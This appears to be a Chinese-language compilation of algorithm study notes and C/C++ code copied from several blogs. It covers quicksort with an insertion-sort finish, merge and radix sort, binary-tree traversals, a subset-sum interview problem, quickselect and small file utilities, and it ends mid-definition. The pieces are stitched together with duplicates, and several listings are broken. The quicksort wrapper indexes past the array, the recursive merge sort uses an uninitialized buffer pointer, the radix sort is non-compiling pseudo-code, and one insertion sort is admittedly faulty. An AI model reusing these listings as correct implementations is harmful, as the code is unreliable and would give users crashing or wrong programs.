快速排序的改进
在本改进算法中,只对长度大于k的子序列递归调用快速排序,让原序列基本有序，然后再对整个基本有序序列用插入排序算法排序。实践证明，改进后的算法时间复杂度有所降低，且当k取值为 8 左右时,改进算法的性能最佳。算法思想如下：
 
 
void print(int a[], int n){
	for(int j= 0; j<n; j++){
		cout<<a[j] <<"  ";
	}
	cout<<endl;
}

void swap(int *a, int *b)
{
	int tmp = *a;
	*a = *b;
	*b = tmp;
}

int partition(int a[], int low, int high)
{
	int privotKey = a[low];					//基准元素
	while(low < high){					//从表的两端交替地向中间扫描
		while(low < high  && a[high] >= privotKey) --high; //从high 所指位置向前搜索，至多到low+1 位置。将比基准元素小的交换到低端
		swap(&a[low], &a[high]);
		while(low < high  && a[low] <= privotKey ) ++low;
		swap(&a[low], &a[high]);
	}
	print(a,10);
	return low;
}


void qsort_improve(int r[ ],int low,int high, int k){
	if( high -low > k ) { //长度大于k时递归, k为指定的数
		int pivot = partition(r, low, high); // 调用的Partition算法保持不变
		qsort_improve(r, low, pivot - 1,k);
		qsort_improve(r, pivot + 1, high,k);
	} 
} 
void quickSort(int r[], int n, int k){
	qsort_improve(r,0,n,k);//先调用改进算法Qsort使之基本有序

	//再用插入排序对基本有序序列排序
	for(int i=1; i<=n;i ++){
		int tmp = r[i]; 
		int j=i-1;
		while(tmp < r[j]){
			r[j+1]=r[j]; j=j-1; 
		}
		r[j+1] = tmp;
	} 

} 



int main(){
	int a[10] = {3,1,5,7,2,4,9,6,10,8};
	cout<<"初始值：";
	print(a,10);
	quickSort(a,9,4);
	cout<<"结果：";
	print(a,10);

}
 
 
7. 归并排序（Merge Sort）
基本思想：
归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。
归并排序示例：

合并方法：
设r[i…n]由两个有序子表r[i…m]和r[m+1…n]组成，两个子表长度分别为n-i +1、n-m。
j=m+1；k=i；i=i; //置两个子表的起始下标及辅助数组的起始下标若i>m 或j>n，转⑷ //其中一个子表已合并完，比较选取结束//选取r[i]和r[j]较小的存入辅助数组rf 
如果r[i]<r[j]，rf[k]=r[i]； i++； k++； 转⑵ 
否则，rf[k]=r[j]； j++； k++； 转⑵//将尚未处理完的子表中元素存入rf 
如果i<=m，将r[i…m]存入rf[k…n] //前一子表非空 
如果j<=n ,  将r[j…n] 存入rf[k…n] //后一子表非空合并结束。 
//将r[i…m]和r[m +1 …n]归并到辅助数组rf[i…n]
void Merge(ElemType *r,ElemType *rf, int i, int m, int n)
{
	int j,k;
	for(j=m+1,k=i; i<=m && j <=n ; ++k){
		if(r[j] < r[i]) rf[k] = r[j++];
		else rf[k] = r[i++];
	}
	while(i <= m)  rf[k++] = r[i++];
	while(j <= n)  rf[k++] = r[j++];
}
归并的迭代算法

1 个元素的表总是有序的。所以对n 个元素的待排序列，每个元素可看成1 个有序子表。对子表两两合并生成n/2个子表，所得子表除最后一个子表长度可能为1 外，其余子表长度均为2。再进行两两合并，直到生成n 个元素按关键码有序的表。
 
 
void print(int a[], int n){
	for(int j= 0; j<n; j++){
		cout<<a[j] <<"  ";
	}
	cout<<endl;
}

//将r[i…m]和r[m +1 …n]归并到辅助数组rf[i…n]
void Merge(ElemType *r,ElemType *rf, int i, int m, int n)
{
	int j,k;
	for(j=m+1,k=i; i<=m && j <=n ; ++k){
		if(r[j] < r[i]) rf[k] = r[j++];
		else rf[k] = r[i++];
	}
	while(i <= m)  rf[k++] = r[i++];
	while(j <= n)  rf[k++] = r[j++];
	print(rf,n+1);
}

void MergeSort(ElemType *r, ElemType *rf, int lenght)
{ 
	int len = 1;
	ElemType *q = r ;
	ElemType *tmp ;
	while(len < lenght) {
		int s = len;
		len = 2 * s ;
		int i = 0;
		while(i+ len <lenght){
			Merge(q, rf,  i, i+ s-1, i+ len-1 ); //对等长的两个子表合并
			i = i+ len;
		}
		if(i + s < lenght){
			Merge(q, rf,  i, i+ s -1, lenght -1); //对不等长的两个子表合并
		}
		tmp = q; q = rf; rf = tmp; //交换q,rf，以保证下一趟归并时，仍从q 归并到rf
	}
}


int main(){
	int a[10] = {3,1,5,7,2,4,9,6,10,8};
	int b[10];
	MergeSort(a, b, 10);
	print(b,10);
	cout<<"结果：";
	print(a,10);

}
两路归并的递归算法
 
 
void MSort(ElemType *r, ElemType *rf,int s, int t)
{ 
	ElemType *rf2;
	if(s==t) r[s] = rf[s];
	else
	{ 
		int m=(s+t)/2;			/*平分*p 表*/
		MSort(r, rf2, s, m);		/*递归地将p[s…m]归并为有序的p2[s…m]*/
		MSort(r, rf2, m+1, t);		/*递归地将p[m+1…t]归并为有序的p2[m+1…t]*/
		Merge(rf2, rf, s, m+1,t);	/*将p2[s…m]和p2[m+1…t]归并到p1[s…t]*/
	}
}
void MergeSort_recursive(ElemType *r, ElemType *rf, int n)
{   /*对顺序表*p 作归并排序*/
	MSort(r, rf,0, n-1);
}
8. 桶排序/基数排序(Radix Sort)
说基数排序之前，我们先说桶排序：
基本思想：是将阵列分到有限数量的桶子里。每个桶子再个别排序（有可能再使用别的排序算法或是以递回方式继续使用桶排序进行排序）。桶排序是鸽巢排序的一种归纳结果。当要被排序的阵列内的数值是均匀分配的时候，桶排序使用线性时间（Θ（n））。但桶排序并不是 比较排序，他不受到 O(n log n) 下限的影响。
         简单来说，就是把数据分组，放在一个个的桶中，然后对每个桶里面的在进行排序。  
例如要对大小为[1..1000]范围内的n个整数A[1..n]排序  
首先，可以把桶设为大小为10的范围，具体而言，设集合B[1]存储[1..10]的整数，集合B[2]存储   (10..20]的整数，……集合B[i]存储(   (i-1)*10,   i*10]的整数，i   =   1,2,..100。总共有  100个桶。 
  然后，对A[1..n]从头到尾扫描一遍，把每个A[i]放入对应的桶B[j]中。  再对这100个桶中每个桶里的数字排序，这时可用冒泡，选择，乃至快排，一般来说任  何排序法都可以。
  最后，依次输出每个桶里面的数字，且每个桶中的数字从小到大输出，这  样就得到所有数字排好序的一个序列了。  
  假设有n个数字，有m个桶，如果数字是平均分布的，则每个桶里面平均有n/m个数字。如果  
  对每个桶中的数字采用快速排序，那么整个算法的复杂度是  
  O(n   +   m   *   n/m*log(n/m))   =   O(n   +   nlogn   -   nlogm)  
  从上式看出，当m接近n的时候，桶排序复杂度接近O(n)  
  当然，以上复杂度的计算是基于输入的n个数字是平均分布这个假设的。这个假设是很强的  ，实际应用中效果并没有这么好。如果所有的数字都落在同一个桶中，那就退化成一般的排序了。 
        前面说的几大排序算法 ，大部分时间复杂度都是O（n2），也有部分排序算法时间复杂度是O(nlogn)。而桶式排序却能实现O（n）的时间复杂度。但桶排序的缺点是：
        1）首先是空间复杂度比较高，需要的额外开销大。排序有两个数组的空间开销，一个存放待排序数组，一个就是所谓的桶，比如待排序值是从0到m-1，那就需要m个桶，这个桶数组就要至少m个空间。
        2）其次待排序的元素都要在一定的范围内等等。
       桶式排序是一种分配排序。分配排序的特定是不需要进行关键码的比较，但前提是要知道待排序列的一些具体情况。

分配排序的基本思想：说白了就是进行多次的桶式排序。
基数排序过程无须比较关键字，而是通过“分配”和“收集”过程来实现排序。它们的时间复杂度可达到线性阶：O(n)。
实例:
扑克牌中52 张牌，可按花色和面值分成两个字段，其大小关系为： 
花色： 梅花< 方块< 红心< 黑心  
面值： 2 < 3 < 4 < 5 < 6 < 7 < 8 < 9 < 10 < J < Q < K < A
若对扑克牌按花色、面值进行升序排序，得到如下序列： 

即两张牌，若花色不同，不论面值怎样，花色低的那张牌小于花色高的，只有在同花色情况下，大小关系才由面值的大小确定。这就是多关键码排序。
为得到排序结果，我们讨论两种排序方法。 方法1：先对花色排序，将其分为4 个组，即梅花组、方块组、红心组、黑心组。再对每个组分别按面值进行排序，最后，将4 个组连接起来即可。方法2：先按13 个面值给出13 个编号组(2 号，3 号，...，A 号)，将牌按面值依次放入对应的编号组，分成13 堆。再按花色给出4 个编号组(梅花、方块、红心、黑心)，将2号组中牌取出分别放入对应花色组，再将3 号组中牌取出分别放入对应花色组，……，这样，4 个花色组中均按面值有序，然后，将4 个花色组依次连接起来即可。
设n 个元素的待排序列包含d 个关键码{k1，k2，…，kd}，则称序列对关键码{k1，k2，…，kd}有序是指：对于序列中任两个记录r[i]和r[j](1≤i≤j≤n)都满足下列有序关系：

其中k1 称为最主位关键码，kd 称为最次位关键码     。
两种多关键码排序方法：
多关键码排序按照从最主位关键码到最次位关键码或从最次位到最主位关键码的顺序逐次排序，分两种方法：
最高位优先(Most Significant Digit first)法，简称MSD 法：
1）先按k1 排序分组，将序列分成若干子序列，同一组序列的记录中，关键码k1 相等。
2）再对各组按k2 排序分成子组，之后，对后面的关键码继续这样的排序分组，直到按最次位关键码kd 对各子组排序后。
3）再将各组连接起来，便得到一个有序序列。扑克牌按花色、面值排序中介绍的方法一即是MSD 法。
最低位优先(Least Significant Digit first)法，简称LSD 法：
1) 先从kd 开始排序，再对kd-1进行排序，依次重复，直到按k1排序分组分成最小的子序列后。
2) 最后将各个子序列连接起来，便可得到一个有序的序列, 扑克牌按花色、面值排序中介绍的方法二即是LSD 法。
基于LSD方法的链式基数排序的基本思想
“多关键字排序”的思想实现“单关键字排序”。对数字型或字符型的单关键字，可以看作由多个数位或多个字符构成的多关键字，此时可以采用“分配-收集”的方法进行排序，这一过程称作基数排序法，其中每个数字或字符可能的取值个数称为基数。比如，扑克牌的花色基数为4，面值基数为13。在整理扑克牌时，既可以先按花色整理，也可以先按面值整理。按花色整理时，先按红、黑、方、花的顺序分成4摞（分配），再按此顺序再叠放在一起（收集），然后按面值的顺序分成13摞（分配），再按此顺序叠放在一起（收集），如此进行二次分配和收集即可将扑克牌排列有序。  
基数排序:
是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以是稳定的。
算法实现：
 
 
Void RadixSort(Node L[],length,maxradix)
{
   int m,n,k,lsp;
   k=1;m=1;
   int temp[10][length-1];
   Empty(temp); //清空临时空间
   while(k<maxradix) //遍历所有关键字
   {
     for(int i=0;i<length;i++) //分配过程
    {
       if(L[i]<m)
          Temp[0][n]=L[i];
       else
          Lsp=(L[i]/m)%10; //确定关键字
       Temp[lsp][n]=L[i];
       n++;
   }
   CollectElement(L,Temp); //收集
   n=0;
   m=m*10;
  k++;
 }
}
总结
各种排序的稳定性，时间复杂度和空间复杂度总结：

我们比较时间复杂度函数的情况：

                             时间复杂度函数O(n)的增长情况

所以对n较大的排序记录。一般的选择都是时间复杂度为O(nlog2n)的排序方法。
时间复杂度来说：
(1)平方阶(O(n2))排序 
各类简单排序:直接插入、直接选择和冒泡排序； 
(2)线性对数阶(O(nlog2n))排序 
快速排序、堆排序和归并排序； 
(3)O(n1+§))排序,§是介于0和1之间的常数。
       希尔排序 
(4)线性阶(O(n))排序 
基数排序，此外还有桶、箱排序。
说明：
当原表有序或基本有序时，直接插入排序和冒泡排序将大大减少比较次数和移动记录的次数，时间复杂度可降至O（n）；
而快速排序则相反，当原表基本有序时，将蜕化为冒泡排序，时间复杂度提高为O（n2）；
原表是否有序，对简单选择排序、堆排序、归并排序和基数排序的时间复杂度影响不大。
稳定性：
排序算法的稳定性:若待排序的序列中，存在多个具有相同关键字的记录，经过排序， 这些记录的相对次序保持不变，则称该算法是稳定的；若经排序后，记录的相对 次序发生了改变，则称该算法是不稳定的。 
稳定性的好处：排序算法如果是稳定的，那么从一个键上排序，然后再从另一个键上排序，第一个键排序的结果可以为第二个键排序所用。基数排序就是这样，先按低位排序，逐次按高位排序，低位相同的元素其顺序再高位也相同时是不会改变的。另外，如果排序算法稳定，可以避免多余的比较；
稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序
不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序
选择排序算法准则：
每种排序算法都各有优缺点。因此，在实用时需根据不同情况适当选用，甚至可以将多种方法结合起来使用。
选择排序算法的依据
影响排序的因素有很多，平均时间复杂度低的算法并不一定就是最优的。相反，有时平均时间复杂度高的算法可能更适合某些特殊情况。同时，选择算法时还得考虑它的可读性，以利于软件的维护。一般而言，需要考虑的因素有以下四点：
1．待排序的记录数目n的大小；
2．记录本身数据量的大小，也就是记录中除关键字外的其他信息量的大小；
3．关键字的结构及其分布情况；
4．对排序稳定性的要求。
设待排序元素的个数为n.
1）当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。
   快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短； 
堆排序 ：  如果内存空间允许且要求稳定性的，
归并排序：它有一定数量的数据移动，所以我们可能过与插入排序组合，先获得一定长度的序列，然后再合并，在效率上将有所提高。
2）  当n较大，内存空间允许，且要求稳定性 =》归并排序
3）当n较小，可采用直接插入或直接选择排序。
    直接插入排序：当元素分布有序，直接插入排序将大大减少比较次数和移动记录的次数。
    直接选择排序 ：元素分布有序，如果不要求稳定性，选择直接选择排序
5）一般不使用或不直接使用传统的冒泡排序。
6）基数排序 
它是一种稳定的排序算法，但有一定的局限性： 
1、关键字可分解。 
2、记录的关键字位数较少，如果密集更好 
3、如果是数字时，最好是无符号的，否则将增加相应的映射复杂度，可先将其正负分开排序。
 
 
注明：转载请提示出处：http://blog.csdn.net/hguisu/article/details/7776068







深度有限遍历记录层数：增加一个level

//深度优先遍历
void depthFirstSearch(Tree root){
    stack<pair<int, Node *> > nodeStack;  //使用C++的STL标准模板库
    nodeStack.push(make_pair(0, root));
    Node *node;
    while(!nodeStack.empty()){
        node = nodeStack.top().second;
        int level = nodeStack.top().first;
        printf(format, node->data);  //遍历根结点
        nodeStack.pop();
        if(node->rchild){
            nodeStack.push(make_pair(level + 1, node->rchild));  //先将右子树压栈
        }
        if(node->lchild){
            nodeStack.push(make_pair(level + 1, node->lchild));  //再将左子树压栈
        }
    }
}



#include <iostream>
#include <stack>
#include <queue>
#include <locale.h>
using namespace std;
typedef struct BiTNode {//二叉树结点
    char data;                      //数据
    struct BiTNode *lchild,*rchild; //左右孩子指针
} BiTNode,*BiTree;
int CreateBiTree(BiTree &T) {//按先序序列创建二叉树
    char data;
    scanf("%c",&data);//按先序次序输入二叉树中结点的值（一个字符），‘#’表示空树
    if (data == '#') {
        T = NULL;
    } else {
        T = (BiTree)malloc(sizeof(BiTNode));
        T->data = data;         //生成根结点
        CreateBiTree(T->lchild);//构造左子树
        CreateBiTree(T->rchild);//构造右子树
    }
    return 0;
}
void Visit(BiTree T) {//输出
    if (T->data != '#') {
        printf("%c ",T->data);
    }
}
void PreOrder(BiTree T) {//先序遍历
    if (T != NULL) {
        Visit(T);               //访问根节点
        PreOrder(T->lchild);    //访问左子结点
        PreOrder(T->rchild);    //访问右子结点
    }
}
void InOrder(BiTree T) {//中序遍历
    if (T != NULL) {
        InOrder(T->lchild);     //访问左子结点
        Visit(T);               //访问根节点
        InOrder(T->rchild);     //访问右子结点
    }
}
void PostOrder(BiTree T) {//后序遍历
    if (T != NULL) {
        PostOrder(T->lchild);   //访问左子结点
        PostOrder(T->rchild);   //访问右子结点
        Visit(T);               //访问根节点
    }
}
void PreOrder2(BiTree T) {//先序遍历(非递归)
//访问T->data后，将T入栈，遍历左子树；遍历完左子树返回时，栈顶元素应为T，出栈，再先序遍历T的右子树。
    stack<BiTree> stack;
    BiTree p = T;//p是遍历指针
    while (p || !stack.empty()) {   //栈不空或者p不空时循环
        if (p != NULL) {
            stack.push(p);          //存入栈中
            printf("%c ",p->data);  //访问根节点
            p = p->lchild;          //遍历左子树
        } else {
            p = stack.top();        //退栈
            stack.pop();
            p = p->rchild;          //访问右子树
        }
    }
}
void InOrder2(BiTree T) {//中序遍历(非递归)
//T是要遍历树的根指针，中序遍历要求在遍历完左子树后，访问根，再遍历右子树。
//先将T入栈，遍历左子树；遍历完左子树返回时，栈顶元素应为T，出栈，访问T->data，再中序遍历T的右子树。
    stack<BiTree> stack;
    BiTree p = T;//p是遍历指针
    while (p || !stack.empty()) {   //栈不空或者p不空时循环
        if (p != NULL) {
            stack.push(p);          //存入栈中
            p = p->lchild;          //遍历左子树
        } else {
            p = stack.top();        //退栈，访问根节点
            printf("%c ",p->data);
            stack.pop();
            p = p->rchild;          //访问右子树
        }
    }
}

typedef struct BiTNodePost{
    BiTree biTree;
    char tag;
} BiTNodePost,*BiTreePost;
void PostOrder2(BiTree T) {//后序遍历(非递归)
    stack<BiTreePost> stack;
    BiTree p = T;//p是遍历指针
    BiTreePost BT;
    while (p != NULL || !stack.empty()) {//栈不空或者p不空时循环
        while (p != NULL) {//遍历左子树
            BT = (BiTreePost)malloc(sizeof(BiTNodePost));
            BT->biTree = p;
            BT->tag = 'L';//访问过左子树
            stack.push(BT);
            p = p->lchild;
        }
        while (!stack.empty() && (stack.top())->tag == 'R') {//左右子树访问完毕访问根节点
            BT = stack.top();
            stack.pop();//退栈
            printf("%c ",BT->biTree->data);
        }
        if (!stack.empty()) {//遍历右子树
            BT = stack.top();
            BT->tag = 'R';//访问过右子树
            p = BT->biTree;
            p = p->rchild;
        }
    }
}

void LevelOrder(BiTree T) {//层次遍历
    if (T == NULL) return;
    BiTree p = T;
    queue<BiTree> queue;//队列
    queue.push(p);//根节点入队
    while (!queue.empty()) {    //队列不空循环
        p = queue.front();      //对头元素出队
        printf("%c ",p->data);  //访问p指向的结点
        queue.pop();            //退出队列
        if (p->lchild != NULL) {//左子树不空，将左子树入队
            queue.push(p->lchild);
        }
        if (p->rchild != NULL) {//右子树不空，将右子树入队
            queue.push(p->rchild);
        }
    }
}
int main() {
    BiTree T;

    setlocale(LC_ALL,"chs");
    CreateBiTree(T);

    printf("先序遍历        ：");PreOrder  (T);printf("\n");
    printf("先序遍历(非递归)：");PreOrder2 (T);printf("\n");
                                               printf("\n");
    printf("中序遍历        ：");InOrder   (T);printf("\n");
    printf("中序遍历(非递归)：");InOrder2  (T);printf("\n");
                                               printf("\n");
    printf("后序遍历        ：");PostOrder (T);printf("\n");
    printf("后序遍历(非递归)：");PostOrder2(T);printf("\n");
                                               printf("\n");
    printf("层次遍历        ：");LevelOrder(T);printf("\n");

    return 0;
}
//ABC##DE#G##F###
//先序遍历        ：A B C D E G F
//先序遍历(非递归)：A B C D E G F
//
//中序遍历        ：C B E G D F A
//中序遍历(非递归)：C B E G D F A
//
//后序遍历        ：C G E F D B A
//后序遍历(非递归)：C G E F D B A
//
//层次遍历        ：A B C D E F G
//

///       A
///      /
///     B
///    / \
///   C   D
///      / \
///     E   F
///      \
///       G



深度优先遍历：

//深度优先遍历
void depthFirstSearch(Tree root){
    stack<Node *> nodeStack;  //使用C++的STL标准模板库
    nodeStack.push(root);
    Node *node;
    while(!nodeStack.empty()){
        node = nodeStack.top();
        printf(format, node->data);  //遍历根结点
        nodeStack.pop();
        if(node->rchild){
            nodeStack.push(node->rchild);  //先将右子树压栈
        }
        if(node->lchild){
            nodeStack.push(node->lchild);  //再将左子树压栈
        }
    }
}<pre class="cpp" name="code">
</pre><pre class="cpp" name="code">  
/**
 * <!--
 * File   : binarytree.h
 * Author : fancy
 * Email  : fancydeepin@yeah.net
 * Date   : 2013-02-03
 * --!>
 */
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <Stack>
#include <Queue>
using namespace std;
#define Element char
#define format "%c"

typedef struct Node {
    Element data;
    struct Node *lchild;
    struct Node *rchild;
} *Tree;

int index = 0;  //全局索引变量

//二叉树构造器,按先序遍历顺序构造二叉树
//无左子树或右子树用'#'表示
void treeNodeConstructor(Tree &root, Element data[]){
    Element e = data[index++];
    if(e == '#'){
        root = NULL;
    }else{
        root = (Node *)malloc(sizeof(Node));
        root->data = e;
        treeNodeConstructor(root->lchild, data);  //递归构建左子树
        treeNodeConstructor(root->rchild, data);  //递归构建右子树
    }
}

//深度优先遍历
void depthFirstSearch(Tree root){
    stack<Node *> nodeStack;  //使用C++的STL标准模板库
    nodeStack.push(root);
    Node *node;
    while(!nodeStack.empty()){
        node = nodeStack.top();
        printf(format, node->data);  //遍历根结点
        nodeStack.pop();
        if(node->rchild){
            nodeStack.push(node->rchild);  //先将右子树压栈
        }
        if(node->lchild){
            nodeStack.push(node->lchild);  //再将左子树压栈
        }
    }
}

//广度优先遍历
void breadthFirstSearch(Tree root){
    queue<Node *> nodeQueue;  //使用C++的STL标准模板库
    nodeQueue.push(root);
    Node *node;
    while(!nodeQueue.empty()){
        node = nodeQueue.front();
        nodeQueue.pop();
        printf(format, node->data);
        if(node->lchild){
            nodeQueue.push(node->lchild);  //先将左子树入队
        }
        if(node->rchild){
            nodeQueue.push(node->rchild);  //再将右子树入队
        }
    }
}
  


广度优先遍历：

//广度优先遍历
void breadthFirstSearch(Tree root){
    queue<Node *> nodeQueue;  //使用C++的STL标准模板库
    nodeQueue.push(root);
    Node *node;
    while(!nodeQueue.empty()){
        node = nodeQueue.front();
        nodeQueue.pop();
        printf(format, node->data);
        if(node->lchild){
            nodeQueue.push(node->lchild);  //先将左子树入队
        }
        if(node->rchild){
            nodeQueue.push(node->rchild);  //再将右子树入队
        }
    }
}



完整代码：








2010 年中兴面试题 
编程求解： 
输入两个整数n 和m，从数列1，2，3.......n 中随意取几个数, 
使其和等于m ,要求将其中所有的可能组合列出来。
// 21 题递归方法 
//copyright@ July && yansha 
//July、yansha，updated。 
#include<list> 
#include<iostream> 
using namespace std; 
list<int>list1; 
void find_factor(int sum, int n) 
{ 
// 递归出口 
if(n <= 0 || sum <= 0) 
return; 
// 输出找到的结果 
if(sum == n) 
{ 
// 反转list 
list1.reverse(); 
for(list<int>::iterator iter = list1.begin(); iter != list1.end(); iter++) 
cout << *iter << " + "; 
cout << n << endl; 
list1.reverse(); 
} 
list1.push_front(n); //典型的01 背包问题 
find_factor(sum-n, n-1); //放n，n-1 个数填满sum-n 
list1.pop_front(); 
find_factor(sum, n-1); //不放n，n-1 个数填满sum 
} 
int main() 
{ 
int sum, n; 
cout << "请输入你要等于多少的数值sum:" << endl; 
cin >> sum; 
cout << "请输入你要从1.....n 数列中取值的n：" << endl; 
cin >> n; 
cout << "所有可能的序列，如下：" << endl; 
find_factor(sum,n); 
return 0; 
}
 
 
逻辑分析：
1、比起微软，google，百度这些公司，中兴的面试题还是略显逗比的，并非是说难度上差异，而是中兴的题目总是显得不伦不类。本题其实就是考察数的组合，对于此类问题，通常手段都是递归，而我们的目标就在于找出递归式。
2、问题其实本质上就是0/1背包问题，对于每一个n，我们采用贪婪策略，先考察是否取n，如果取n，那么子问题就变成了find(n-1,m-n)，而如果舍弃n，子问题则为find(n-1,m)。至此，我们利用DP思想找到了递归式（很多时候，所谓动态规划，贪婪只是一念之差）。
3、那么，如何制定解的判定策略？我们知道，递归需要边界条件，而针对背包问题，边界条件只有两种，如果n<1或者m<1，那么便相当于“溢出”，无法combo出m，而另一种可能就是在剩余的n个里恰好满足m==n，即此时 背包刚好填充满，输出一组解单元。除此之外，再无其他。
C源码：
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int length;

void findCombination(int n,int m,int *flag)
{
	if(n < 1 || m < 1)
		return;
	if(n > m)
		n = m;
	if(n == m)
	{
		flag[n-1] = 1;
		for(int i=0;i<length;i++)
		{
			if(flag[i] == 1)
				printf("%d\t",i+1);
		}
		printf("\n");
		flag[n-1] = 0;
	}
	flag[n-1] = 1;
	findCombination(n-1,m-n,flag);
	flag[n-1] = 0;

	findCombination(n-1,m,flag);
}

int main()
{
	int n, m;
	scanf("%d%d",&n,&m);
	length = n;
	int *flag = (int*)malloc(sizeof(int)*length);
	findCombination(n,m,flag);
	free(flag);
	return 0;
}

注：我们设置flag背包，用来标注对应的n+1是否被选中，1表示被选中，0则表示未选中，每当满足m==n时，则输出一组解。程序容易产生逻辑bug的地方在于length的使用（读者可以思考一下为何需要全局变量length，而不是直接使用n来代替for循环）。







 
 代码来自：
 
http://blog.csdn.net/v_JULY_v
 
 
算法思想：
 

// Quick_select.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <time.h>

using namespace std;

const int num_array = 13;
const int num_med_array = num_array/5 + 1;

int array[num_array];
int midian_array[num_med_array];

/*
//插入排序算法伪代码
INSERTION-SORT(A)                                                 cost times
1 for j ← 2 to length[A]                                           c1 n
2 do key ← A[j]                                                    c2 n - 1
3 Insert A[j] into the sorted sequence A[1 ‥ j - 1]. 0...n - 1
4 i ← j - 1                                                        c4 n - 1
5 while i > 0 and A[i] > key                                        c5
6 do A[i + 1] ← A[i]                                               c6
7 i ← i - 1                                                        c7
8 A[i + 1] ← key                                                   c8 n - 1
*/


void insert_sort(int array[], int left, int loop_times)
{//这块的插入排序感觉有点问题，第一个数字没有排啊
	for (int j = left; j < left+loop_times; j++)
	{
		int key = array[j];
		int i = j - 1;

		while (i > left && array[i] > key)
		{
			array[i+1] = array[i];
			i--;
		}

		array[i+1] = key;
	}
}

void insertion_sort(int array[],int first,int last)
{
	int i,j;
	int temp;
	for(i = first + 1 ;i<=last;i++)
	{
		temp = array[i];
		j=i-1;
		//与已排序的数逐一比较，大于temp时，该数移后
		while((j>=0)&&(array[j]>temp))
		{
			array[j+1]=array[j];
			j--;
		}
		//存在大于temp的数
		if(j!=i-1)
		{array[j+1]=temp;}
	}

}

int find_median(int array[], int left, int right)
{
	if (left == right)
		return array[left];int index;
	for (index = left; index < right - 5; index += 5)
	{
		//insert_sort(array, index, 4);
		insertion_sort(array,index,4);
		int num = index - left;
		midian_array[num / 5] = array[index + 2];
	}
	// 处理剩余元素
	int remain_num = right - index + 1;
	if (remain_num > 0)
	{
		//insert_sort(array, index, remain_num - 1);
		insertion_sort(array,index,remain_num - 1);
		int num = index - left;
		midian_array[num / 5] = array[index + remain_num / 2];
	}
	int elem_aux_array = (right - left) / 5 - 1;
	if ((right - left) % 5 != 0)
		elem_aux_array++;
	// 如果剩余一个元素返回，否则继续递归
	if (elem_aux_array == 0)
		return midian_array[0];
	else
		return find_median(midian_array, 0, elem_aux_array);
}

// 寻找中位数的所在位置
int find_index(int array[], int left, int right, int median)
{
	for (int i = left; i <= right; i++)
	{
		if (array[i] == median)
			return i;
	}
	return -1;
}


int q_select(int array[], int left, int right, int k)
{
	// 寻找中位数的中位数
	int median = find_median(array, left, right);
	// 将中位数的中位数与最右元素交换
	int index = find_index(array, left, right, median);
	swap(array[index], array[right]);
	int pivot = array[right];
	// 申请两个移动指针并初始化
	int i = left;
	int j = right - 1;
	// 根据枢纽元素的值对数组进行一次划分
	while (true)
	{
		while(array[i] < pivot)
			i++;
		while(array[j] > pivot)
			j--;
		if (i < j)
			swap(array[i], array[j]);
		else
			break;
	}
	swap(array[i], array[right]);
	/* 对三种情况进行处理：(m = i - left + 1)
	1、如果m=k，即返回的主元即为我们要找的第k 小的元素，那么直接返回主元a[i]即可;
	2、如果m>k，那么接下来要到低区间A[0....m-1]中寻找，丢掉高区间;
	3、如果m<k，那么接下来要到高区间A[m+1...n-1]中寻找，丢掉低区间。
	*/
	int m = i - left + 1;
	if (m == k)
		return array[i];
	else if(m > k)
		//上条语句相当于if( (i-left+1) >k)，即if( (i-left) > k-1 )，于此就与2.2 节里的
		//代码实现一、二相对应起来了。
		return q_select(array, left, i - 1, k);
	else
		return q_select(array, i + 1, right, k - m);
}


	
int _tmain(int argc, _TCHAR* argv[])
{
	//srand(unsigned(time(NULL)));
	//for (int j = 0; j < num_array; j++)
	int a[4] = {13,26,9,100};
	insert_sort(a,0,3);

	//insertion_sort(a,0,3);

	cout<<a[0]<<a[1]<<a[2]<<a[3]<<endl;


	//array[j] = rand();
	int array[num_array]={0,45,78,55,47,4,1,2,7,8,96,36,45};
	// 寻找第k 最小数
	int k = 13;
	int i = q_select(array, 0, num_array - 1, k);
	cout << i << endl;

	
	getchar();
	return 0;
}



 






 
 
写日志：
class LogFile
{
public:
  static LogFile &instance();
  operator FILE *() const { return m_file; }
private
  LogFile(const char *filename)
  {
     m_file = fopen(filename, "a+");
  }
  ~LogFile()
  {
     fclose(m_file);
  }
  FILE *m_file;
};

LogFile &LogFile::instance()
{
   static LogFile log("AppLog.txt");
   return log;
}

用的时候可以这么写：
fwrite("abc", 1, 3, LogFile::instance());

 
 
 
读取文件信息：
 c语言实现如下功能 输入全部文件名（绝对路径加文件名）得到，文件名，扩展名，文件长度
/* MAKEPATH.C */
#include<string.h>
#include <stdlib.h>
#include <stdio.h>

#define LENGTH 200


struct FILEHEAD
{
	char path_buffer[LENGTH];
	char filename[LENGTH];
	char ext[LENGTH];
	unsigned int length;
	
};

FILEHEAD file; 

void getFileInformation(FILEHEAD file)
{
	memset(&file,0,sizeof(file)); 
	
	//_makepath( path_buffer, "c", "\\sample\\crt\\", "makepath", "c" );
	printf( "Path created with : \n\n");
	scanf("%s",file.path_buffer);
	_splitpath( file.path_buffer, NULL, NULL, file.filename, file.ext );
	
	FILE *fp= NULL;
	fp=fopen(file.path_buffer,"r");
	if (NULL==fp)
	{
		printf("cannot open the %s \n",file.path_buffer);
		exit(0);
	}
	
	fseek(fp,0l,SEEK_END);
	file.length=ftell(fp);
	
	fclose(fp);
	fp = NULL; //需要指向空，否则会指向原打开文件地址
	
	
	
	printf( "Path extracted with _splitpath:\n" );
	//printf( "  Drive: %s\n", drive );
	//printf( "  Dir: %s\n", dir );
	printf( "  Filename: %s\n", file.filename );
	printf( "  Ext: %s\n", file.ext );
	printf( "  length is btye: %ld btye\n", file.length );
}

int main( void )
{
	
	getFileInformation(file);

	system("pause");

	return 0;
}


算法排序框架：
 
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define TRUE 1
#define FALSE 0
#define MAX 10000

typedef int KeyType;
typedef int OtherType;

typedef struct
